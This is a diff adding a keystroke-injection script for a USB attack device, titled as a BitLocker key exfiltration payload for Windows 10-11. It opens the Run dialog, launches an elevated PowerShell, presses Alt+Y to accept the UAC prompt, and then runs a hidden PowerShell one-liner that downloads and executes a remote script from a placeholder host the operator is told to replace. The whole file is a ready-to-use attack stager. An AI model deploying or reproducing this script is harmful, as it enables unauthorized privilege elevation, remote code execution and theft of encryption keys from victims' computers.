@@ -1,0 +1,21 @@
+REM ###################################################################
+REM #                                                                 |
+REM # Title        : Bitlocker-Key-Telegram-Exfiltration              |
+REM # Author       : Droid-MAX                                        |
+REM # Description  : A script used to dump target Bitlocker Keys.     |
+REM # Category     : Credentials                                      |
+REM # Target       : Windows 10-11                                    |
+REM # Version      : 1.0                                              |
+REM #                                                                 |
+REM ###################################################################
+
+DELAY 200
+GUI r
+DELAY 200
+STRINGLN powershell -c "Start-Process PowerShell -Verb RunAs"
+DELAY 500
+ALT y
+DELAY 500
+
+REM Reply example.com with YOUR LINK.
+STRINGLN powershell -nop -w h -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')"
